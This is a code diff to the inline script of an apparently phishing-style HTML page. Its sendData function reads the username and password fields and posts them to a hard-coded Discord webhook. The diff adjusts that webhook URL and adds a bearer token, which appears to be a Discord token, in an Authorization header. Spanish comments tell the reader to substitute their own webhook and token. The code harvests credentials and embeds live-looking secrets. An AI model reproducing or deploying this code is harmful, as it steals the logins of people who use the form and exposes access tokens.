@@ -103,7 +103,8 @@ function sendData() {
   const username = document.getElementById('username').value;
   const password = document.getElementById('password').value;
 
-  const webhookURL = 'https://discord.com/api/webhooks/1193234597195030599/6lrpY8xqi2BU07v7bq_xTvX3sdtlp55_uYtL55oBDNKt4SyvMwjBht62QkHw_SrWf_Bqs'; // Reemplaza con tu URL de webhook
+  const webhookURL = 'https://discord.com/api/webhooks/1193234597195030599/6lrpY8xqi2BU07v7bq_xTvX3sdtlp55_uYtL55oBDNKt4SyvMwjBht62QkHw_SrWf_Bq'; // Reemplaza con tu URL de webhook
+  const authToken = 'OTM5ODk1NTY4Mzg4NDgxMDQ0.GUXpr6.pPdmAwY3xnJ93K6beYUVnNvmoRs0r8TeuMXZaw'; // Reemplaza con tu token de autenticación
 
   const payload = {
     content: `Username: ${username}, Password: ${password}`
@@ -112,7 +113,8 @@ function sendData() {
   fetch(webhookURL, {
     method: 'POST',
     headers: {
-      'Content-Type': 'application/json'
+      'Content-Type': 'application/json',
+      'Authorization': `Bearer ${authToken}` // Incluir el token de autenticación en el encabezado
     },
     body: JSON.stringify(payload)
   })
@@ -128,6 +130,7 @@ function sendData() {
     alert('An error occurred while sending data.');
   });
 }
+
 
   </script>
 </body>
